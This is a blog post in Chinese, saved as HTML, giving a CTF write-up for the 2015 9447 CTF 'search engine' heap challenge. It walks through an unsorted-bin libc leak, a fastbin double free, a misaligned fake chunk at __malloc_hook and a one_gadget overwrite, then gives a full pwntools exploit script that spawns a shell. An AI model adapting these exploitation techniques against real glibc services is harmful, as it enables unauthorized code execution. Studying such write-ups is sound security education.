@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;fastbin-attack&#x2F;2015_9447ctf_search-engine grxer@Ubuntu16 ~&#x2F;D&#x2F;p&#x2F;heap&gt; checksec search [*] &amp;#x27;&#x2F;home&#x2F;grxer&#x2F;Desktop&#x2F;pwn&#x2F;heap&#x2F;search&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Arbitrary Alloc 2015 9447 CTF:Search Engine">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;fastbin-attack&#x2F;2015_9447ctf_search-engine grxer@Ubuntu16 ~&#x2F;D&#x2F;p&#x2F;heap&gt; checksec search [*] &amp;#x27;&#x2F;home&#x2F;grxer&#x2F;Desktop&#x2F;pwn&#x2F;heap&#x2F;search&amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234446142.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230817100848581.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000552113.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000725835.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000936214.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320002318652.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320003959634.png">
+<meta property="article:published_time" content="2023-03-19T13:25:06.000Z">
+<meta property="article:modified_time" content="2023-08-17T02:08:53.857Z">
+<meta property="article:author" content="bxz">
+<meta property="article:tag" content="Unsorted Bin Leak">
+<meta property="article:tag" content="Byte misalignmen">
+<meta property="article:tag" content="Double Free">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Arbitrary Alloc 2015 9447 CTF:Search Engine</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/20/2017-0ctf-babyheap/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/19/23-2-21-elf/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&text=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&is_video=false&description=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Arbitrary Alloc 2015 9447 CTF:Search Engine&body=Check out this article: https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&name=Arbitrary Alloc 2015 9447 CTF:Search Engine&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&t=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.</span> <span class="toc-text">unsorted bin泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8"><span class="toc-number">2.</span> <span class="toc-text">fastbin循环链表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E9%94%99%E4%BD%8D-Arbitrary-Alloc-and-malloc-hook"><span class="toc-number">3.</span> <span class="toc-text">字节错位 Arbitrary Alloc and malloc hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Arbitrary Alloc 2015 9447 CTF:Search Engine
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-19T13:25:06.000Z" itemprop="datePublished">2023-03-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Byte-misalignmen/" rel="tag">Byte misalignmen</a>, <a class="tag-link-link" href="/tags/Double-Free/" rel="tag">Double Free</a>, <a class="tag-link-link" href="/tags/Unsorted-Bin-Leak/" rel="tag">Unsorted Bin Leak</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec search </span><br><span class="line">[*] <span class="string">&#x27;/home/grxer/Desktop/pwn/heap/search&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>这道题静态分析起来挺复杂的，自定义的输入函数，各种阻力，最后配合gdb动态才搞明白</p>
+<p>index_sentence()读取用户输入size长度的sentence，他还会用下面的结构把每个句子的单词分开构成一个单链表，单链表的content是从sentence地址上原数据地址，表头在0x6020B8，单链表表头是最后一个单词</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> word_struct     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> content         dq ?单词</span><br><span class="line"><span class="number">00000008</span> size            dd ?单词</span><br><span class="line"><span class="number">0000000</span>C padding1        dd ?</span><br><span class="line"><span class="number">00000010</span> sentence_ptr    dq ?句子                 ; offset</span><br><span class="line"><span class="number">00000018</span> len             dd ?整个句子</span><br><span class="line"><span class="number">0000001</span>C padding2        dd ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> word_struct     ends</span><br></pre></td></tr></table></figure>
+
+<p>这里由于空间复用其实heap manger给我们0x30大小chunk</p>
+<p>search_word()读取一个输入长度比较<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(i-&gt;sentence_ptr, <span class="number">0</span>, i-&gt;len);</span><br><span class="line"><span class="built_in">free</span>(i-&gt;sentence_ptr);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里找到之前把整个句子都给置零了，也没有free后置null，但是我们的struct地址都还在用，就从这里开始把</p>
+<h2 id="unsorted-bin泄露libc"><a href="#unsorted-bin泄露libc" class="headerlink" title="unsorted bin泄露libc"></a>unsorted bin泄露libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">smallbin_sentence = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们这样会申请到三个堆，一个sentence两个word，‘ b’-&gt;‘a’*0x85，我们search(‘b’)，释放掉sentence堆，这个时候申请到的chunk大小0x90超过了fastbin，进入unsortbin，unsorted bin是个双向循环列表所以释放chunk的fd和bk会填上，unsortedbin的开始</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png" alt="image-20230319221406963"></p>
+<p>__由于释放后单链表还存在我们再次search,<code>if ( *i-&gt;sentence_ptr )</code>i-&gt;sentence_ptr是sentence chunk的fd指针被填上了unsorted bin绕过__，为了绕过<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code>，第一个我们的size还是1，由于memset(i-&gt;sentence_ptr, 0, i-&gt;len)会把整个句子置零，搜索0即可绕过,<code>fwrite(i-&gt;sentence_ptr, 1uLL, i-&gt;len, stdout);</code>会配合我们输出处bk和fd</p>
+<p>unsorted bin地址距离main_arena,main_arena是glibc里的一个全局变量，偏移固定0x3C4B20，所以我们可以得到libc</p>
+<h2 id="fastbin循环链表"><a href="#fastbin循环链表" class="headerlink" title="fastbin循环链表"></a>fastbin循环链表</h2><p>由于free后没有置零，我们可以doublefree，构成循环链表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>都free后a-&gt;b-&gt;c-&gt;0</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234446142.png" alt="image-20230319234446142"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br></pre></td></tr></table></figure>
+
+<p>再次free，这里的c是过不了if ( *i-&gt;sentence_ptr )检测的因为他是第一个释放的chunk，fastbin单链表只使用fd执行单向链接，所以她的fd为0</p>
+<p>只需要将b释放这样b-&gt;fd指向a，且a的fd指向b，循环链表</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230817100848581.png" alt="image-20230817100848581"></p>
+<h2 id="字节错位-Arbitrary-Alloc-and-malloc-hook"><a href="#字节错位-Arbitrary-Alloc-and-malloc-hook" class="headerlink" title="字节错位 Arbitrary Alloc and malloc hook"></a>字节错位 Arbitrary Alloc and malloc hook</h2><p>有了循环链表我们就可以伪造或者找一个fakechunk进行申请</p>
+<p>有了main_arena地址后，我们想mallochook，malloc__hook在main_arean的上面是0x10字节处，</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000552113.png" alt="image-20230320000552113"></p>
+<p>我们直接用find_fake_fast在上面利用字节错位找到一个chunk</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000725835.png" alt="image-20230320000725835"></p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000936214.png" alt="image-20230320000936214"></p>
+<p>fakechunk偏移为main_arean的上面-0x33</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里0x7f fastbin_index后为5，0x70的chunk，这里由于fastbin是分组的单链表，只有相同大小的freechunk才会构成单链表，所以我们需要在前面构成循环链表的大小为0x70，即申请0x60，同时我们需要在申请0x60大小申请到这个fakechunk</p>
+<table>
+<thead>
+<tr>
+<th>fastbinsY[]</th>
+<th>x86（size_t&#x3D;4）</th>
+<th>x64（size_t&#x3D;8）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>0x10</td>
+<td>0x20</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0x18</td>
+<td>0x30</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0x20</td>
+<td>0x40</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0x28</td>
+<td>0x50</td>
+</tr>
+<tr>
+<td>4</td>
+<td>0x30</td>
+<td>0x60</td>
+</tr>
+<tr>
+<td>5</td>
+<td>0x38</td>
+<td>0x70</td>
+</tr>
+<tr>
+<td>6</td>
+<td>0x40</td>
+<td>0x80</td>
+</tr>
+</tbody></table>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br></pre></td></tr></table></figure>
+
+<p>这次会申请到b，这样我们可以控制b的fd指针为fakechunk</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320002318652.png" alt="image-20230320002318652"></p>
+<p>再申请两次0x60大小chunk就可以申请到fakechunk</p>
+<p>fakechunk距离malloc_hook0x23,我们是往fakechunk+0x10写数据，所以需要0x13大小padding</p>
+<p>写入onegadget</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/Desktop&gt; one_gadget ./libc-2.23.so </span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell,跑路喽</p>
+<p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320003959634.png" alt="image-20230320003959634"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./search&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_sentence</span>(<span class="params">s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)).encode())</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_word</span>(<span class="params">word</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)).encode())</span><br><span class="line">    io.send(word)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B41&#x27;)#judge</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B41&#x27;)# rcx</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BED&#x27;)</span></span><br><span class="line">smallbin_sentence = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">b&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Found 135: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
